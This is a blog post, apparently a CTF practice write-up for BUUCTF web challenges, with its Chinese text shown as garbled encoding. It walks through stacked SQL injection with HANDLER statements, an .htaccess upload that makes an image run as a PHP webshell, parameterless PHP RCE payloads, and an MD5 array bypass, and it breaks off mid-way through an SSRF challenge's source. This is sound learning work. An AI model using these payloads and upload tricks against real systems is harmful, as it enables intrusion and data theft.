<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    
    
    <title>BUUCTF webç»ƒä¹ 5 | Damya&#39;s Blog | ã‚ã‚„ã‚„ã“ã‚„ã‚„</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="ä¸ªäººctfç«èµ›">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
<link rel="alternate" href="/atom.xml" title="Damya's Blog" type="application/atom+xml">
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Damya</h5>
          <a href="mailto:397526596@qq.com" title="397526596@qq.com" class="mail">
            
              <span>3</span>
            
              <span>9</span>
            
              <span>7</span>
            
              <span>5</span>
            
              <span>2</span>
            
              <span>6</span>
            
              <span>5</span>
            
              <span>9</span>
            
              <span>6</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://github.com/DamyaHome" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                CATEGORIES
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                ABOUT
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>BUUCTF webç»ƒä¹ 5</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">BUUCTF webç»ƒä¹ 5</h1>
        <h5 class="subtitle">
            
                <time datetime="2020-10-07T13:12:09.000Z" itemprop="datePublished" class="page-time">
  2020-10-07
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup-web/">ctf writeup web</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-BUUCTF-webç»ƒä¹ 5"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">BUUCTF webç»ƒä¹ 5</h1>
        <div class="post-meta">
            <time class="post-time" title="2020-10-07 21:12:09" datetime="2020-10-07T13:12:09.000Z"  itemprop="datePublished">2020-10-07</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup-web/">ctf writeup web</a></li></ul>



            

            


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><a href="http://202bc5e9-02e8-4c36-9793-151b247a806c.node3.buuoj.cn" target="_blank" rel="noopener">http://202bc5e9-02e8-4c36-9793-151b247a806c.node3.buuoj.cn</a></p>
<p>ç»æµ‹è¯•æ˜¯å­—ç¬¦å‹æ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./1.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./1.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>å°è¯•è”åˆæŸ¥è¯¢,çˆ†å‡ºäº†é»‘åå•,å…ˆç”¨showæŸ¥ç€</p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./2.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./2.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®åŒ¹é…,å…ˆé—­åˆè¯­å¥å†è¿›è¡ŒæŸ¥è¯¢<br><figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./3.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./3.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show databases;#</span><br><span class="line">?inject=1&apos;;show tables;#</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./4.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./4.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>çœ‹åˆ°æ˜æ˜¾çš„FlagHereè¡¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show tables;show columns from FlagHere;show columns from words;#</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./5.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./5.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>åœ¨mysqlé‡Œè¿˜èƒ½ä½¿ç”¨handlerè¿›è¡ŒæŸ¥è¯¢,å…·ä½“ä½¿ç”¨<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a></p>
<p>handlerâ€¦openè¯­å¥å°†æ‰“å¼€ä¸€ä¸ªè¡¨,ä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­handlerâ€¦readè¯­å¥è¿›è¡Œè®¿é—®,è¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«,å¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨handlerâ€¦closeæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./6.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./6.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>flag{901a13f0-67cb-4dd5-b765-0d2c02c91e81}</p>
<h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p><a href="http://5f42ce42-df7b-494b-bf63-bab03cd0f852.node3.buuoj.cn" target="_blank" rel="noopener">http://5f42ce42-df7b-494b-bf63-bab03cd0f852.node3.buuoj.cn</a></p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./7.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./7.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>è¿‡æ»¤å¾—å¾ˆä¸¥,åªèƒ½ä¸Šä¼ å›¾ç‰‡,ä½†.htaccessä¹Ÿå¯ä»¥ä¸Šä¼ </p>
<p>ä¼ å…¥.htaccessæ–‡ä»¶ä½œä¸ºphpè§£æå™¨,ä½¿æˆ‘ä»¬ä¼ å…¥çš„å›¾ç‰‡é©¬é‡ŒåŒ…å«çš„phpè¯­å¥ç”Ÿæ•ˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./8.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./8.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./9.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./9.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>åœ¨ç”¨èšå‰‘è¿æ¥æ—¶è¿æ¥å›¾ç‰‡åœ°å€</p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./10.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./10.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>è¿›åˆ°æ ¹ç›®å½•è·å¾—flag</p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./11.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./11.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>flag{29c63dce-7ee9-4f02-a809-c41bf114cd19}</p>
<h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p><a href="http://b8053621-499f-4613-8852-d66828da67fe.node3.buuoj.cn" target="_blank" rel="noopener">http://b8053621-499f-4613-8852-d66828da67fe.node3.buuoj.cn</a></p>
<p>å…ˆdirmapæ‰«ä¸ªç›®å½•</p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./12.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./12.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>çœ‹åˆ°æœ‰.gitéšè—æ–‡ä»¶,ç”¨githackæ¢å¤</p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./13.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./13.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">Â  Â  <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//è¿‡æ»¤ä¼ªåè®®</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//æ­£åˆ™åŒ¹é…,ä¼ å‚ä¼šè¢«æ›¿æ¢æˆNULLä¸”è¯­å¥çš„åˆæ³•å½¢å¼æ˜¯a(b());</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">Â  Â  Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">else</span>&#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  <span class="keyword">die</span>(<span class="string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span>);</span><br><span class="line">Â  Â  Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">else</span>&#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">die</span>(<span class="string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span>);</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">else</span>&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">die</span>(<span class="string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span>);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="æ–¹æ³•ä¸€-åˆ©ç”¨å¸¸é‡å‡½æ•°"><a href="#æ–¹æ³•ä¸€-åˆ©ç”¨å¸¸é‡å‡½æ•°" class="headerlink" title="æ–¹æ³•ä¸€:åˆ©ç”¨å¸¸é‡å‡½æ•°"></a>æ–¹æ³•ä¸€:åˆ©ç”¨å¸¸é‡å‡½æ•°</h3><p>æ— å‚RCEéœ€è¦ä¸€äº›phpè‡ªå¸¦å¸¸é‡çš„å‡½æ•°æ¥æ„é€ payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir()) //é¦–å…ˆæƒ³åˆ°çš„æ˜¯è¾“å‡ºç›®å½•,å¦‚ä½•æŒ‡å®šå½“å‰ç›®å½•?</span><br><span class="line">?exp=print_r(scandir(current(localeconv()))) //current(localeconv())ç»“åˆ,è¾“å‡ºæœ¬åœ°æ•°ç»„çš„å€¼</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./14.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./14.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>phpé‡Œæœ‰ä¸ªnext()å‡½æ•°å¯ä»¥ç”¨æ¥è¯»å–æ•°ç»„çš„ä¸‹ä¸€ä½å…ƒç´ ,ä½†åœ¨è¿™é¢˜ä¸­ä¸èƒ½è¿ç»­ä½¿ç”¨,å› ä¸ºä¸é€‚ç”¨a(b())æ ¼å¼,å¯flag.phpæ­£å·§åœ¨å€’æ•°ç¬¬äºŒä½,æ‰€ä»¥å¯ä»¥å…ˆç”¨array_reverse()å°†æ•°ç»„å€’åºå†è¿›è¡Œè¯»å–,æ ¹æ®ä»£ç æ³¨é‡Šé‡‡ç”¨highlight_file()è¿›è¡Œè¾“å‡º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./15.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./15.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>flag{16bab8e9-4333-4ff6-9ca3-ef4b717467ad}</p>
<h3 id="æ–¹æ³•äºŒ-åˆ©ç”¨session"><a href="#æ–¹æ³•äºŒ-åˆ©ç”¨session" class="headerlink" title="æ–¹æ³•äºŒ:åˆ©ç”¨session"></a>æ–¹æ³•äºŒ:åˆ©ç”¨session</h3><p>è¿™æ˜¯çœ‹å¤§ä½¬åšå®¢å‘ç°çš„æ–¹æ³•,payloadå¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆéœ€è¦ç†è§£sessionçš„å·¥ä½œåŸç†</p>
<ol>
<li>é¦–å…ˆä½¿ç”¨session_start()å‡½æ•°è¿›è¡Œåˆå§‹åŒ–</li>
<li>å½“æ‰§è¡ŒPHPè„šæœ¬æ—¶ï¼Œé€šè¿‡ä½¿ç”¨$_SESSIONè¶…å…¨å±€å˜é‡æ³¨å†Œsessionå˜é‡</li>
<li>å½“PHPè„šæœ¬æ‰§è¡Œç»“æŸæ—¶ï¼Œæœªè¢«é”€æ¯çš„sessionå˜é‡ä¼šè¢«è‡ªåŠ¨ä¿å­˜åœ¨æœ¬åœ°ä¸€å®šè·¯å¾„ä¸‹çš„sessionåº“ä¸­ï¼Œè¿™ä¸ªè·¯å¾„å¯ä»¥é€šè¿‡php.iniæ–‡ä»¶ä¸­çš„session.save_pathæŒ‡å®šï¼Œä¸‹æ¬¡æµè§ˆç½‘é¡µæ—¶å¯ä»¥åŠ è½½ä½¿ç”¨</li>
</ol>
<p>è€Œsession_start()åˆå§‹åŒ–çš„ä¸œè¥¿å¯ä»¥åœ¨cookieé‡Œä½¿ç”¨é»˜è®¤å€¼PHPSESSIDæˆ–è€…php.iniä¸­è®¾å®šçš„session.nameè¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œå¦‚æœè¯»å–åˆ°äº†è¿™ä¸ªcookieå°†ä¼šåˆ›å»º$_SESSIONå˜é‡å¹¶ä»ç›¸åº”ç›®å½•ä¸­è¯»å–æ–‡ä»¶ï¼Œå¹¶å°†å­—ç¬¦è£…å…¥å˜é‡ä¸­ï¼›å¦‚æœæ²¡è¯»å–åˆ°ä¹Ÿä¼šåˆ›å»º$_SESSIONå˜é‡å’Œsessionæ–‡ä»¶å¹¶è¿”å›å€¼ã€‚</p>
<p>è·å–åˆ°session_start()çš„åˆå§‹å€¼åï¼Œsession_id()å¯ä»¥ç”¨æ¥è·å–sessionä¼šè¯çš„idï¼Œåœ¨cookieé‡ŒæŒ‡å®šåˆ°flag.phpåè¿›è¡Œè¯»å–ï¼Œå†ç”¨show_source()è¿›è¡Œè¾“å‡ºã€‚</p>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./16.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./16.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><a href="http://a8085622-bd11-414f-9ac0-6bebed5d4231.node3.buuoj.cn" target="_blank" rel="noopener">http://a8085622-bd11-414f-9ac0-6bebed5d4231.node3.buuoj.cn</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">	$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">	$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">	$gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">	<span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">	$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">	highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;Please input first</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦è¿›è¡Œäº†GETæ–¹é¢$ggå’Œ$idçš„md5åˆ¤æ–­,å’ŒPOSTæ–¹é¢çš„$passwdå¯†ç ä¼ å‚<br>ç›´æ¥æ•°ç»„ç»•è¿‡md5åˆ¤æ–­,æ•°å­—åŠ å­—æ¯ç»•è¿‡å¯†ç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?gg[]=a&amp;id[]=b</span><br><span class="line">passwd=1234567a</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=BUUCTF webç»ƒä¹ 5 href="./17.png" title="å›¾ç‰‡" data-fancybox="images"><img src="./17.png" alt="å›¾ç‰‡" title class></a>
                <p>å›¾ç‰‡</p>
            </figure>
<p>flag{9cada024-2b17-4a01-ad45-23871db3d3c9}</p>
<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p><a href="http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn" target="_blank" rel="noopener">http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn</a></p>
<p>å°†ä»£ç è¿›è¡Œæ’ç‰ˆ,æ˜¯ä¸ªflaskçš„æ¡†æ¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> 